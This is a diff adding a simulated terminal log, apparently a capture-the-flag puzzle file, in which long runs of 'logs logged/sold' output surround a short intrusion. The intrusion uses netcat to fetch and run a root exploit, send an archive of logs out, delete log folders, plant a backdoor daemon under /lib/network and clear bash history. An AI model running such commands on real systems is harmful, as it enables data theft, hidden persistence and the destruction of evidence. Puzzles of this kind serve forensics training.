@@ -1,0 +1,490 @@
+Welcome to LoggerOS 11.02.3 (GNU/Linux 4.7.8-23-generic)
+
+john@logger:~# ./logger
+
+Wed 06/13 11:55:03 START : ************************** STARTING LOGGING **************************
+Wed 06/13 11:55:03 LOG   : 0 logs logged!
+Wed 06/13 11:56:02 LOG   : 6 logs logged!
+Wed 06/13 11:56:43 PROC  : Processing 6 logs! 
+Wed 06/13 11:57:30 LOG   : 13 logs logged!
+Wed 06/13 11:58:19 PROC  : Processing 13 logs! 
+Wed 06/13 11:59:18 LOG   : 5 logs logged!
+Wed 06/13 11:59:59 LOG   : 6 logs logged!
+Wed 06/13 12:00:51 LOG   : 10 logs logged!
+Wed 06/13 12:01:45 LOG   : 5 logs logged!
+Wed 06/13 12:02:37 LOG   : 13 logs logged!
+Wed 06/13 12:03:20 PROC  : Processing 28 logs! (11 logs still need processing)
+Wed 06/13 12:04:06 SELL  : Sold 47 logs for $130.00 each! 
+Wed 06/13 12:04:06 PROF  : Profitted $6110.00! ($6110.00 total)
+Wed 06/13 12:04:51 PROC  : Processing 11 logs! 
+Wed 06/13 12:05:35 LOG   : 14 logs logged!
+Wed 06/13 12:06:29 LOG   : 8 logs logged!
+Wed 06/13 12:07:18 PROC  : Processing 22 logs! 
+Wed 06/13 12:08:04 LOG   : 5 logs logged!
+Wed 06/13 12:08:55 LOG   : 9 logs logged!
+Wed 06/13 12:09:35 LOG   : 6 logs logged!
+Wed 06/13 12:10:27 SELL  : Sold 33 logs for $108.00 each! 
+Wed 06/13 12:10:27 PROF  : Profitted $3564.00! ($9674.00 total)
+Wed 06/13 12:11:20 LOG   : 14 logs logged!
+Wed 06/13 12:12:04 PROC  : Processing 30 logs! (4 logs still need processing)
+Wed 06/13 12:12:55 SELL  : Sold 30 logs for $100.00 each! 
+Wed 06/13 12:12:55 PROF  : Profitted $3000.00! ($12674.00 total)
+Wed 06/13 12:13:37 PROC  : Processing 4 logs! 
+Wed 06/13 12:14:22 LOG   : 9 logs logged!
+Wed 06/13 12:15:11 SELL  : Sold 4 logs for $97.00 each! 
+Wed 06/13 12:15:11 PROF  : Profitted $388.00! ($13062.00 total)
+Wed 06/13 12:16:10 LOG   : 7 logs logged!
+Wed 06/13 12:16:58 LOG   : 5 logs logged!
+Wed 06/13 12:17:46 LOG   : 8 logs logged!
+Wed 06/13 12:18:35 LOG   : 11 logs logged!
+Wed 06/13 12:19:16 LOG   : 5 logs logged!
+Wed 06/13 12:20:13 LOG   : ^C
+
+john@logger:~# nc -l 1337 > exploit
+john@logger:~# chmod +x exploit
+john@logger:~# ./exploit
+# whoami
+root
+# ls
+exploit  logs  site
+# ls logs 
+2016  2017  2018
+# tar -cf data.tar.gz ~/logs
+tar: Removing leading `/' from member names
+tar: /home/john/data.tar.gz: file is the archive; not dumped
+# nc -l 1337 < data.tar.gz
+# rm -rf /home/john/logs/2018/6/10 /home/john/logs/2018/6/11 /home/john/logs/2018/6/12
+# rm data.tar.gz
+# mkdir /lib/network
+# nc -l 1337 > /lib/network/daemon
+# chmod +x /lib/network/daemon
+# /lib/network/daemon
+Success... running on port 1338
+# nc logger.sdc.tf 1338
+Pass: 82d192aa35a6298997e9456cb3a0b5dd92e4d6411c56af2169bed167b53f38d
+ls /home/john
+exploit  logs  site
+^C
+# rm exploit
+# echo "" > .bash_history
+# echo "" > ~/.bash_history
+# exit
+john@logger:~# ./logger
+
+Wed 06/13 12:55:03 START : ************************** STARTING LOGGING **************************
+Wed 06/13 12:55:03 LOG   : 0 logs logged!
+Wed 06/13 12:55:48 LOG   : 6 logs logged!
+Wed 06/13 12:56:37 PROC  : Processing 6 logs! 
+Wed 06/13 12:57:31 SELL  : Sold 6 logs for $123.00 each! 
+Wed 06/13 12:57:31 PROF  : Profitted $738.00! ($738.00 total)
+Wed 06/13 12:58:23 LOG   : 6 logs logged!
+Wed 06/13 12:59:09 LOG   : 6 logs logged!
+Wed 06/13 12:59:50 PROC  : Processing 12 logs! 
+Wed 06/13 01:00:47 LOG   : 13 logs logged!
+Wed 06/13 01:01:39 PROC  : Processing 13 logs! 
+Wed 06/13 01:02:35 LOG   : 8 logs logged!
+Wed 06/13 01:03:25 SELL  : Sold 25 logs for $107.00 each! 
+Wed 06/13 01:03:25 PROF  : Profitted $2675.00! ($3413.00 total)
+Wed 06/13 01:04:24 LOG   : 13 logs logged!
+Wed 06/13 01:05:10 LOG   : 10 logs logged!
+Wed 06/13 01:05:58 LOG   : 9 logs logged!
+Wed 06/13 01:06:39 LOG   : 8 logs logged!
+Wed 06/13 01:07:22 PROC  : Processing 29 logs! (19 logs still need processing)
+Wed 06/13 01:08:08 LOG   : 11 logs logged!
+Wed 06/13 01:08:58 LOG   : 7 logs logged!
+Wed 06/13 01:09:57 PROC  : Processing 25 logs! (12 logs still need processing)
+Wed 06/13 01:10:49 LOG   : 7 logs logged!
+Wed 06/13 01:11:29 PROC  : Processing 19 logs! 
+Wed 06/13 01:12:23 LOG   : 13 logs logged!
+Wed 06/13 01:13:16 PROC  : Processing 13 logs! 
+Wed 06/13 01:14:06 LOG   : 9 logs logged!
+Wed 06/13 01:14:55 LOG   : 5 logs logged!
+Wed 06/13 01:15:37 LOG   : 13 logs logged!
+Wed 06/13 01:16:32 SELL  : Sold 51 logs for $129.00 each! There are still 35 unsold logs!
+Wed 06/13 01:16:32 PROF  : Profitted $6579.00! ($9992.00 total)
+Wed 06/13 01:17:20 PROC  : Processing 25 logs! (2 logs still need processing)
+Wed 06/13 01:18:04 LOG   : 9 logs logged!
+Wed 06/13 01:18:56 LOG   : 11 logs logged!
+Wed 06/13 01:19:43 LOG   : 11 logs logged!
+Wed 06/13 01:20:27 PROC  : Processing 26 logs! (7 logs still need processing)
+Wed 06/13 01:21:10 SELL  : Sold 54 logs for $126.00 each! There are still 32 unsold logs!
+Wed 06/13 01:21:10 PROF  : Profitted $6804.00! ($16796.00 total)
+Wed 06/13 01:22:09 LOG   : 8 logs logged!
+Wed 06/13 01:23:06 LOG   : 5 logs logged!
+Wed 06/13 01:23:59 LOG   : 12 logs logged!
+Wed 06/13 01:24:39 PROC  : Processing 30 logs! (2 logs still need processing)
+Wed 06/13 01:25:25 LOG   : 12 logs logged!
+Wed 06/13 01:26:15 SELL  : Sold 53 logs for $132.00 each! There are still 9 unsold logs!
+Wed 06/13 01:26:15 PROF  : Profitted $6996.00! ($23792.00 total)
+Wed 06/13 01:27:07 LOG   : 5 logs logged!
+Wed 06/13 01:27:50 PROC  : Processing 19 logs! 
+Wed 06/13 01:28:33 LOG   : 5 logs logged!
+Wed 06/13 01:29:13 LOG   : 12 logs logged!
+Wed 06/13 01:30:02 LOG   : 9 logs logged!
+Wed 06/13 01:31:00 SELL  : Sold 28 logs for $128.00 each! 
+Wed 06/13 01:31:00 PROF  : Profitted $3584.00! ($27376.00 total)
+Wed 06/13 01:31:53 LOG   : 7 logs logged!
+Wed 06/13 01:32:41 LOG   : 7 logs logged!
+Wed 06/13 01:33:36 LOG   : 11 logs logged!
+Wed 06/13 01:34:31 PROC  : Processing 28 logs! (23 logs still need processing)
+Wed 06/13 01:35:17 PROC  : Processing 23 logs! 
+Wed 06/13 01:36:09 LOG   : 11 logs logged!
+Wed 06/13 01:37:00 LOG   : 13 logs logged!
+Wed 06/13 01:37:50 SELL  : Sold 45 logs for $91.00 each! There are still 6 unsold logs!
+Wed 06/13 01:37:50 PROF  : Profitted $4095.00! ($31471.00 total)
+Wed 06/13 01:38:44 LOG   : 14 logs logged!
+Wed 06/13 01:39:33 PROC  : Processing 33 logs! (5 logs still need processing)
+Wed 06/13 01:40:23 LOG   : 9 logs logged!
+Wed 06/13 01:41:05 PROC  : Processing 14 logs! 
+Wed 06/13 01:41:52 SELL  : Sold 48 logs for $93.00 each! There are still 5 unsold logs!
+Wed 06/13 01:41:52 PROF  : Profitted $4464.00! ($35935.00 total)
+Wed 06/13 01:42:40 LOG   : 5 logs logged!
+Wed 06/13 01:43:27 PROC  : Processing 5 logs! 
+Wed 06/13 01:44:13 LOG   : 14 logs logged!
+Wed 06/13 01:44:58 LOG   : 12 logs logged!
+Wed 06/13 01:45:55 PROC  : Processing 26 logs! 
+Wed 06/13 01:46:43 LOG   : 12 logs logged!
+Wed 06/13 01:47:36 LOG   : 9 logs logged!
+Wed 06/13 01:48:17 SELL  : Sold 36 logs for $105.00 each! 
+Wed 06/13 01:48:17 PROF  : Profitted $3780.00! ($39715.00 total)
+Wed 06/13 01:49:03 LOG   : 10 logs logged!
+Wed 06/13 01:49:49 LOG   : 11 logs logged!
+Wed 06/13 01:50:45 LOG   : 7 logs logged!
+Wed 06/13 01:51:28 PROC  : Processing 33 logs! (16 logs still need processing)
+Wed 06/13 01:52:19 LOG   : 6 logs logged!
+Wed 06/13 01:53:14 PROC  : Processing 22 logs! 
+Wed 06/13 01:54:07 LOG   : 13 logs logged!
+Wed 06/13 01:55:03 PROC  : Processing 13 logs! 
+Wed 06/13 01:55:53 LOG   : 11 logs logged!
+Wed 06/13 01:56:41 LOG   : 10 logs logged!
+Wed 06/13 01:57:28 PROC  : Processing 21 logs! 
+Wed 06/13 01:58:22 LOG   : 7 logs logged!
+Wed 06/13 01:59:02 PROC  : Processing 7 logs! 
+Wed 06/13 01:59:55 LOG   : 9 logs logged!
+Wed 06/13 02:00:53 LOG   : 10 logs logged!
+Wed 06/13 02:01:40 PROC  : Processing 19 logs! 
+Wed 06/13 02:02:28 LOG   : 5 logs logged!
+Wed 06/13 02:03:20 SELL  : Sold 47 logs for $118.00 each! There are still 68 unsold logs!
+Wed 06/13 02:03:20 PROF  : Profitted $5546.00! ($45261.00 total)
+Wed 06/13 02:04:04 PROC  : Processing 5 logs! 
+Wed 06/13 02:04:51 LOG   : 7 logs logged!
+Wed 06/13 02:05:32 SELL  : Sold 51 logs for $89.00 each! There are still 22 unsold logs!
+Wed 06/13 02:05:32 PROF  : Profitted $4539.00! ($49800.00 total)
+Wed 06/13 02:06:14 PROC  : Processing 7 logs! 
+Wed 06/13 02:06:58 LOG   : 8 logs logged!
+Wed 06/13 02:07:39 PROC  : Processing 8 logs! 
+Wed 06/13 02:08:35 LOG   : 5 logs logged!
+Wed 06/13 02:09:20 LOG   : 11 logs logged!
+Wed 06/13 02:10:01 PROC  : Processing 16 logs! 
+Wed 06/13 02:10:54 LOG   : 6 logs logged!
+Wed 06/13 02:11:36 LOG   : 7 logs logged!
+Wed 06/13 02:12:18 LOG   : 7 logs logged!
+Wed 06/13 02:13:15 SELL  : Sold 45 logs for $101.00 each! There are still 8 unsold logs!
+Wed 06/13 02:13:15 PROF  : Profitted $4545.00! ($54345.00 total)
+Wed 06/13 02:14:03 SELL  : Sold 8 logs for $121.00 each! 
+Wed 06/13 02:14:03 PROF  : Profitted $968.00! ($55313.00 total)
+Wed 06/13 02:14:46 PROC  : Processing 20 logs! 
+Wed 06/13 02:15:26 LOG   : 14 logs logged!
+Wed 06/13 02:16:15 LOG   : 10 logs logged!
+Wed 06/13 02:16:57 SELL  : Sold 20 logs for $111.00 each! 
+Wed 06/13 02:16:57 PROF  : Profitted $2220.00! ($57533.00 total)
+Wed 06/13 02:17:56 LOG   : 13 logs logged!
+Wed 06/13 02:18:53 LOG   : 12 logs logged!
+Wed 06/13 02:19:40 LOG   : 11 logs logged!
+Wed 06/13 02:20:28 LOG   : 9 logs logged!
+Wed 06/13 02:21:11 PROC  : Processing 28 logs! (41 logs still need processing)
+Wed 06/13 02:22:09 LOG   : 10 logs logged!
+Wed 06/13 02:22:51 PROC  : Processing 30 logs! (21 logs still need processing)
+Wed 06/13 02:23:35 PROC  : Processing 21 logs! 
+Wed 06/13 02:24:17 LOG   : 7 logs logged!
+Wed 06/13 02:25:08 PROC  : Processing 7 logs! 
+Wed 06/13 02:26:05 LOG   : 11 logs logged!
+Wed 06/13 02:26:54 SELL  : Sold 49 logs for $105.00 each! There are still 37 unsold logs!
+Wed 06/13 02:26:54 PROF  : Profitted $5145.00! ($62678.00 total)
+Wed 06/13 02:27:45 SELL  : Sold 37 logs for $101.00 each! 
+Wed 06/13 02:27:45 PROF  : Profitted $3737.00! ($66415.00 total)
+Wed 06/13 02:28:39 LOG   : 14 logs logged!
+Wed 06/13 02:29:23 LOG   : 8 logs logged!
+Wed 06/13 02:30:22 LOG   : 9 logs logged!
+Wed 06/13 02:31:07 LOG   : 6 logs logged!
+Wed 06/13 02:32:02 LOG   : 6 logs logged!
+Wed 06/13 02:32:50 LOG   : 13 logs logged!
+Wed 06/13 02:33:43 LOG   : 5 logs logged!
+Wed 06/13 02:34:25 LOG   : 10 logs logged!
+Wed 06/13 02:35:23 LOG   : 11 logs logged!
+Wed 06/13 02:36:18 LOG   : 10 logs logged!
+Wed 06/13 02:37:12 LOG   : 13 logs logged!
+Wed 06/13 02:38:06 PROC  : Processing 26 logs! (90 logs still need processing)
+Wed 06/13 02:38:52 LOG   : 13 logs logged!
+Wed 06/13 02:39:41 LOG   : 9 logs logged!
+Wed 06/13 02:40:23 LOG   : 12 logs logged!
+Wed 06/13 02:41:21 LOG   : 6 logs logged!
+Wed 06/13 02:42:19 LOG   : 8 logs logged!
+Wed 06/13 02:42:59 LOG   : 8 logs logged!
+Wed 06/13 02:43:42 LOG   : 9 logs logged!
+Wed 06/13 02:44:40 SELL  : Sold 26 logs for $90.00 each! 
+Wed 06/13 02:44:40 PROF  : Profitted $2340.00! ($68755.00 total)
+Wed 06/13 02:45:30 LOG   : 8 logs logged!
+Wed 06/13 02:46:22 PROC  : Processing 34 logs! (129 logs still need processing)
+Wed 06/13 02:47:15 LOG   : 12 logs logged!
+Wed 06/13 02:48:00 PROC  : Processing 28 logs! (113 logs still need processing)
+Wed 06/13 02:48:49 LOG   : 6 logs logged!
+Wed 06/13 02:49:29 PROC  : Processing 33 logs! (86 logs still need processing)
+Wed 06/13 02:50:24 LOG   : 9 logs logged!
+Wed 06/13 02:51:23 LOG   : 11 logs logged!
+Wed 06/13 02:52:14 PROC  : Processing 32 logs! (74 logs still need processing)
+Wed 06/13 02:53:07 PROC  : Processing 34 logs! (40 logs still need processing)
+Wed 06/13 02:54:06 LOG   : 8 logs logged!
+Wed 06/13 02:54:57 LOG   : 6 logs logged!
+Wed 06/13 02:55:39 PROC  : Processing 33 logs! (21 logs still need processing)
+Wed 06/13 02:56:32 PROC  : Processing 21 logs! 
+Wed 06/13 02:57:17 LOG   : 10 logs logged!
+Wed 06/13 02:58:01 PROC  : Processing 10 logs! 
+Wed 06/13 02:58:58 LOG   : 8 logs logged!
+Wed 06/13 02:59:38 PROC  : Processing 8 logs! 
+Wed 06/13 03:00:18 LOG   : 6 logs logged!
+Wed 06/13 03:01:08 LOG   : 13 logs logged!
+Wed 06/13 03:02:01 LOG   : 7 logs logged!
+Wed 06/13 03:02:43 PROC  : Processing 26 logs! 
+Wed 06/13 03:03:26 LOG   : 5 logs logged!
+Wed 06/13 03:04:19 LOG   : 8 logs logged!
+Wed 06/13 03:05:08 SELL  : Sold 49 logs for $89.00 each! There are still 210 unsold logs!
+Wed 06/13 03:05:08 PROF  : Profitted $4361.00! ($73116.00 total)
+Wed 06/13 03:05:49 LOG   : 6 logs logged!
+Wed 06/13 03:06:44 PROC  : Processing 19 logs! 
+Wed 06/13 03:07:35 LOG   : 8 logs logged!
+Wed 06/13 03:08:20 LOG   : 10 logs logged!
+Wed 06/13 03:09:09 LOG   : 7 logs logged!
+Wed 06/13 03:10:08 LOG   : 13 logs logged!
+Wed 06/13 03:10:52 LOG   : 11 logs logged!
+Wed 06/13 03:11:45 LOG   : 11 logs logged!
+Wed 06/13 03:12:41 PROC  : Processing 29 logs! (31 logs still need processing)
+Wed 06/13 03:13:24 LOG   : 8 logs logged!
+Wed 06/13 03:14:08 LOG   : 11 logs logged!
+Wed 06/13 03:15:07 LOG   : 5 logs logged!
+Wed 06/13 03:16:01 PROC  : Processing 33 logs! (22 logs still need processing)
+Wed 06/13 03:16:50 SELL  : Sold 51 logs for $113.00 each! There are still 240 unsold logs!
+Wed 06/13 03:16:50 PROF  : Profitted $5763.00! ($78879.00 total)
+Wed 06/13 03:17:33 PROC  : Processing 22 logs! 
+Wed 06/13 03:18:18 LOG   : 6 logs logged!
+Wed 06/13 03:19:08 PROC  : Processing 6 logs! 
+Wed 06/13 03:19:57 LOG   : 7 logs logged!
+Wed 06/13 03:20:42 LOG   : 5 logs logged!
+Wed 06/13 03:21:41 LOG   : 14 logs logged!
+Wed 06/13 03:22:34 LOG   : 5 logs logged!
+Wed 06/13 03:23:23 PROC  : Processing 31 logs! 
+Wed 06/13 03:24:11 LOG   : 10 logs logged!
+Wed 06/13 03:25:03 LOG   : 11 logs logged!
+Wed 06/13 03:25:43 PROC  : Processing 21 logs! 
+Wed 06/13 03:26:42 LOG   : 13 logs logged!
+Wed 06/13 03:27:25 LOG   : 12 logs logged!
+Wed 06/13 03:28:15 LOG   : 11 logs logged!
+Wed 06/13 03:29:05 SELL  : Sold 46 logs for $88.00 each! There are still 274 unsold logs!
+Wed 06/13 03:29:05 PROF  : Profitted $4048.00! ($82927.00 total)
+Wed 06/13 03:30:02 PROC  : Processing 32 logs! (4 logs still need processing)
+Wed 06/13 03:30:54 PROC  : Processing 4 logs! 
+Wed 06/13 03:31:37 LOG   : 13 logs logged!
+Wed 06/13 03:32:31 PROC  : Processing 13 logs! 
+Wed 06/13 03:33:28 LOG   : 13 logs logged!
+Wed 06/13 03:34:26 PROC  : Processing 13 logs! 
+Wed 06/13 03:35:15 SELL  : Sold 51 logs for $123.00 each! There are still 285 unsold logs!
+Wed 06/13 03:35:15 PROF  : Profitted $6273.00! ($89200.00 total)
+Wed 06/13 03:36:00 LOG   : 9 logs logged!
+Wed 06/13 03:36:57 SELL  : Sold 54 logs for $90.00 each! There are still 231 unsold logs!
+Wed 06/13 03:36:57 PROF  : Profitted $4860.00! ($94060.00 total)
+Wed 06/13 03:37:41 LOG   : 7 logs logged!
+Wed 06/13 03:38:21 LOG   : 12 logs logged!
+Wed 06/13 03:39:10 PROC  : Processing 28 logs! 
+Wed 06/13 03:40:03 LOG   : 8 logs logged!
+Wed 06/13 03:40:45 PROC  : Processing 8 logs! 
+Wed 06/13 03:41:25 LOG   : 9 logs logged!
+Wed 06/13 03:42:12 PROC  : Processing 9 logs! 
+Wed 06/13 03:43:01 SELL  : Sold 54 logs for $93.00 each! There are still 222 unsold logs!
+Wed 06/13 03:43:01 PROF  : Profitted $5022.00! ($99082.00 total)
+Wed 06/13 03:43:47 LOG   : 8 logs logged!
+Wed 06/13 03:44:31 PROC  : Processing 8 logs! 
+Wed 06/13 03:45:23 LOG   : 9 logs logged!
+Wed 06/13 03:46:04 LOG   : 13 logs logged!
+Wed 06/13 03:46:54 PROC  : Processing 22 logs! 
+Wed 06/13 03:47:44 LOG   : 9 logs logged!
+Wed 06/13 03:48:35 LOG   : 14 logs logged!
+Wed 06/13 03:49:19 LOG   : 14 logs logged!
+Wed 06/13 03:50:04 LOG   : 9 logs logged!
+Wed 06/13 03:50:54 SELL  : Sold 51 logs for $108.00 each! There are still 201 unsold logs!
+Wed 06/13 03:50:54 PROF  : Profitted $5508.00! ($104590.00 total)
+Wed 06/13 03:51:46 LOG   : 7 logs logged!
+Wed 06/13 03:52:31 PROC  : Processing 29 logs! (24 logs still need processing)
+Wed 06/13 03:53:11 LOG   : 6 logs logged!
+Wed 06/13 03:54:02 LOG   : 6 logs logged!
+Wed 06/13 03:54:48 LOG   : 10 logs logged!
+Wed 06/13 03:55:41 LOG   : 10 logs logged!
+Wed 06/13 03:56:21 PROC  : Processing 34 logs! (22 logs still need processing)
+Wed 06/13 03:57:17 LOG   : 11 logs logged!
+Wed 06/13 03:58:00 PROC  : Processing 31 logs! (2 logs still need processing)
+Wed 06/13 03:58:49 LOG   : 6 logs logged!
+Wed 06/13 03:59:39 LOG   : 7 logs logged!
+Wed 06/13 04:00:27 LOG   : 13 logs logged!
+Wed 06/13 04:01:25 SELL  : Sold 49 logs for $104.00 each! There are still 246 unsold logs!
+Wed 06/13 04:01:25 PROF  : Profitted $5096.00! ($109686.00 total)
+Wed 06/13 04:02:12 LOG   : 8 logs logged!
+Wed 06/13 04:03:08 LOG   : 11 logs logged!
+Wed 06/13 04:04:07 SELL  : Sold 54 logs for $127.00 each! There are still 192 unsold logs!
+Wed 06/13 04:04:07 PROF  : Profitted $6858.00! ($116544.00 total)
+Wed 06/13 04:04:59 PROC  : Processing 31 logs! (16 logs still need processing)
+Wed 06/13 04:05:46 PROC  : Processing 16 logs! 
+Wed 06/13 04:06:32 SELL  : Sold 45 logs for $119.00 each! There are still 194 unsold logs!
+Wed 06/13 04:06:32 PROF  : Profitted $5355.00! ($121899.00 total)
+Wed 06/13 04:07:30 SELL  : Sold 54 logs for $103.00 each! There are still 140 unsold logs!
+Wed 06/13 04:07:30 PROF  : Profitted $5562.00! ($127461.00 total)
+Wed 06/13 04:08:16 LOG   : 5 logs logged!
+Wed 06/13 04:08:57 LOG   : 13 logs logged!
+Wed 06/13 04:09:51 LOG   : 7 logs logged!
+Wed 06/13 04:10:35 PROC  : Processing 25 logs! 
+Wed 06/13 04:11:23 LOG   : 9 logs logged!
+Wed 06/13 04:12:18 LOG   : 12 logs logged!
+Wed 06/13 04:13:04 PROC  : Processing 21 logs! 
+Wed 06/13 04:13:52 LOG   : 11 logs logged!
+Wed 06/13 04:14:33 PROC  : Processing 11 logs! 
+Wed 06/13 04:15:18 LOG   : 9 logs logged!
+Wed 06/13 04:16:15 LOG   : 6 logs logged!
+Wed 06/13 04:17:01 LOG   : 13 logs logged!
+Wed 06/13 04:17:57 SELL  : Sold 54 logs for $104.00 each! There are still 143 unsold logs!
+Wed 06/13 04:17:57 PROF  : Profitted $5616.00! ($133077.00 total)
+Wed 06/13 04:18:41 SELL  : Sold 51 logs for $112.00 each! There are still 92 unsold logs!
+Wed 06/13 04:18:41 PROF  : Profitted $5712.00! ($138789.00 total)
+Wed 06/13 04:19:28 PROC  : Processing 28 logs! 
+Wed 06/13 04:20:12 LOG   : 7 logs logged!
+Wed 06/13 04:20:59 LOG   : 10 logs logged!
+Wed 06/13 04:21:47 LOG   : 12 logs logged!
+Wed 06/13 04:22:33 SELL  : Sold 45 logs for $111.00 each! There are still 75 unsold logs!
+Wed 06/13 04:22:33 PROF  : Profitted $4995.00! ($143784.00 total)
+Wed 06/13 04:23:18 SELL  : Sold 52 logs for $92.00 each! There are still 23 unsold logs!
+Wed 06/13 04:23:18 PROF  : Profitted $4784.00! ($148568.00 total)
+Wed 06/13 04:24:17 PROC  : Processing 29 logs! 
+Wed 06/13 04:24:59 SELL  : Sold 51 logs for $97.00 each! There are still 1 unsold logs!
+Wed 06/13 04:24:59 PROF  : Profitted $4947.00! ($153515.00 total)
+Wed 06/13 04:25:41 LOG   : 8 logs logged!
+Wed 06/13 04:26:21 LOG   : 12 logs logged!
+Wed 06/13 04:27:03 SELL  : Sold 1 logs for $92.00 each! 
+Wed 06/13 04:27:03 PROF  : Profitted $92.00! ($153607.00 total)
+Wed 06/13 04:27:59 PROC  : Processing 20 logs! 
+Wed 06/13 04:28:39 SELL  : Sold 20 logs for $116.00 each! 
+Wed 06/13 04:28:39 PROF  : Profitted $2320.00! ($155927.00 total)
+Wed 06/13 04:29:33 LOG   : 9 logs logged!
+Wed 06/13 04:30:14 PROC  : Processing 9 logs! 
+Wed 06/13 04:31:07 LOG   : 10 logs logged!
+Wed 06/13 04:31:52 LOG   : 10 logs logged!
+Wed 06/13 04:32:41 LOG   : 6 logs logged!
+Wed 06/13 04:33:40 SELL  : Sold 9 logs for $128.00 each! 
+Wed 06/13 04:33:40 PROF  : Profitted $1152.00! ($157079.00 total)
+Wed 06/13 04:34:31 PROC  : Processing 26 logs! 
+Wed 06/13 04:35:19 LOG   : 8 logs logged!
+Wed 06/13 04:36:14 PROC  : Processing 8 logs! 
+Wed 06/13 04:36:58 LOG   : 13 logs logged!
+Wed 06/13 04:37:48 LOG   : 5 logs logged!
+Wed 06/13 04:38:38 PROC  : Processing 18 logs! 
+Wed 06/13 04:39:27 LOG   : 6 logs logged!
+Wed 06/13 04:40:19 LOG   : 11 logs logged!
+Wed 06/13 04:41:16 LOG   : 11 logs logged!
+Wed 06/13 04:42:06 SELL  : Sold 46 logs for $96.00 each! There are still 6 unsold logs!
+Wed 06/13 04:42:06 PROF  : Profitted $4416.00! ($161495.00 total)
+Wed 06/13 04:43:00 SELL  : Sold 6 logs for $103.00 each! 
+Wed 06/13 04:43:00 PROF  : Profitted $618.00! ($162113.00 total)
+Wed 06/13 04:43:42 PROC  : Processing 28 logs! 
+Wed 06/13 04:44:26 LOG   : 12 logs logged!
+Wed 06/13 04:45:24 PROC  : Processing 12 logs! 
+Wed 06/13 04:46:18 LOG   : 10 logs logged!
+Wed 06/13 04:47:12 PROC  : Processing 10 logs! 
+Wed 06/13 04:47:55 SELL  : Sold 47 logs for $99.00 each! There are still 3 unsold logs!
+Wed 06/13 04:47:55 PROF  : Profitted $4653.00! ($166766.00 total)
+Wed 06/13 04:48:46 LOG   : 9 logs logged!
+Wed 06/13 04:49:37 PROC  : Processing 9 logs! 
+Wed 06/13 04:50:28 LOG   : 6 logs logged!
+Wed 06/13 04:51:10 PROC  : Processing 6 logs! 
+Wed 06/13 04:51:58 LOG   : 7 logs logged!
+Wed 06/13 04:52:41 PROC  : Processing 7 logs! 
+Wed 06/13 04:53:28 LOG   : 5 logs logged!
+Wed 06/13 04:54:20 PROC  : Processing 5 logs! 
+Wed 06/13 04:55:10 SELL  : Sold 30 logs for $98.00 each! 
+Wed 06/13 04:55:10 PROF  : Profitted $2940.00! ($169706.00 total)
+Wed 06/13 04:56:02 LOG   : 9 logs logged!
+Wed 06/13 04:56:55 LOG   : 14 logs logged!
+Wed 06/13 04:57:52 LOG   : 10 logs logged!
+Wed 06/13 04:58:38 PROC  : Processing 33 logs! 
+Wed 06/13 04:59:33 SELL  : Sold 33 logs for $109.00 each! 
+Wed 06/13 04:59:33 PROF  : Profitted $3597.00! ($173303.00 total)
+Wed 06/13 05:00:29 LOG   : 7 logs logged!
+Wed 06/13 05:01:11 LOG   : 10 logs logged!
+Wed 06/13 05:01:59 LOG   : 7 logs logged!
+Wed 06/13 05:02:48 LOG   : 10 logs logged!
+Wed 06/13 05:03:29 PROC  : Processing 33 logs! (1 logs still need processing)
+Wed 06/13 05:04:26 LOG   : 9 logs logged!
+Wed 06/13 05:05:23 SELL  : Sold 33 logs for $115.00 each! 
+Wed 06/13 05:05:23 PROF  : Profitted $3795.00! ($177098.00 total)
+Wed 06/13 05:06:12 LOG   : 5 logs logged!
+Wed 06/13 05:07:00 PROC  : Processing 15 logs! 
+Wed 06/13 05:07:45 SELL  : Sold 15 logs for $97.00 each! 
+Wed 06/13 05:07:45 PROF  : Profitted $1455.00! ($178553.00 total)
+Wed 06/13 05:08:43 LOG   : 13 logs logged!
+Wed 06/13 05:09:26 PROC  : Processing 13 logs! 
+Wed 06/13 05:10:25 LOG   : 6 logs logged!
+Wed 06/13 05:11:08 LOG   : 11 logs logged!
+Wed 06/13 05:11:53 PROC  : Processing 17 logs! 
+Wed 06/13 05:12:51 LOG   : 11 logs logged!
+Wed 06/13 05:13:32 PROC  : Processing 11 logs! 
+Wed 06/13 05:14:13 SELL  : Sold 41 logs for $120.00 each! 
+Wed 06/13 05:14:13 PROF  : Profitted $4920.00! ($183473.00 total)
+Wed 06/13 05:15:07 LOG   : 7 logs logged!
+Wed 06/13 05:15:55 PROC  : Processing 7 logs! 
+Wed 06/13 05:16:54 LOG   : 12 logs logged!
+Wed 06/13 05:17:36 PROC  : Processing 12 logs! 
+Wed 06/13 05:18:27 SELL  : Sold 19 logs for $93.00 each! 
+Wed 06/13 05:18:27 PROF  : Profitted $1767.00! ($185240.00 total)
+Wed 06/13 05:19:10 LOG   : 11 logs logged!
+Wed 06/13 05:20:04 PROC  : Processing 11 logs! 
+Wed 06/13 05:20:48 SELL  : Sold 11 logs for $90.00 each! 
+Wed 06/13 05:20:48 PROF  : Profitted $990.00! ($186230.00 total)
+Wed 06/13 05:21:37 LOG   : 13 logs logged!
+Wed 06/13 05:22:17 LOG   : 7 logs logged!
+Wed 06/13 05:23:10 LOG   : 5 logs logged!
+Wed 06/13 05:23:59 LOG   : 6 logs logged!
+Wed 06/13 05:24:55 PROC  : Processing 31 logs! 
+Wed 06/13 05:25:40 LOG   : 14 logs logged!
+Wed 06/13 05:26:24 LOG   : 13 logs logged!
+Wed 06/13 05:27:08 LOG   : 12 logs logged!
+Wed 06/13 05:28:05 LOG   : 8 logs logged!
+Wed 06/13 05:28:45 PROC  : Processing 34 logs! (13 logs still need processing)
+Wed 06/13 05:29:33 LOG   : 13 logs logged!
+Wed 06/13 05:30:19 LOG   : 14 logs logged!
+Wed 06/13 05:31:15 LOG   : 14 logs logged!
+Wed 06/13 05:31:57 LOG   : 9 logs logged!
+Wed 06/13 05:32:51 LOG   : 7 logs logged!
+Wed 06/13 05:33:36 LOG   : 5 logs logged!
+Wed 06/13 05:34:30 SELL  : Sold 48 logs for $132.00 each! There are still 17 unsold logs!
+Wed 06/13 05:34:30 PROF  : Profitted $6336.00! ($192566.00 total)
+Wed 06/13 05:35:21 PROC  : Processing 25 logs! (50 logs still need processing)
+Wed 06/13 05:36:20 LOG   : 9 logs logged!
+Wed 06/13 05:37:16 PROC  : Processing 29 logs! (30 logs still need processing)
+Wed 06/13 05:38:09 PROC  : Processing 26 logs! (4 logs still need processing)
+Wed 06/13 05:39:00 PROC  : Processing 4 logs! 
+Wed 06/13 05:39:51 LOG   : 5 logs logged!
+Wed 06/13 05:40:41 LOG   : 11 logs logged!
+Wed 06/13 05:41:33 LOG   : 8 logs logged!
